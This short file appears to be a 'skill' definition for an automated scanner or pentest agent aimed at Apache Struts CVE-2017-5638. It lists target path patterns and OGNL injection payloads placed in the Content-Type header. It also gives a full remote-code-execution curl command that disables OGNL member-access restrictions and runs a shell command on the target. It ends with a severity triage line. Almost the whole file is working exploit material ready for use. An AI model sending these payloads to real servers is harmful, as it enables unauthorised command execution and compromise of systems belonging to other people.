# SKILL: apache-struts
## Paths
*.action, *.do, *.jsp, *.struts, *.java, *.out, *.bat, *.seam, *.sh, *.bson, *.el, *.pm
## Payloads (CVE-2017-5638)
Content-Type: .multipart/form-data~%{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("tuhin",220)}
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Mehul',4*4)}.multipart/form-data
## Full RCE
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#p=new java.lang.ProcessBuilder({'/bin/bash','-c','id'})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://target.com/home.action
## Triage
Header reflection → High. RCE → Critical.
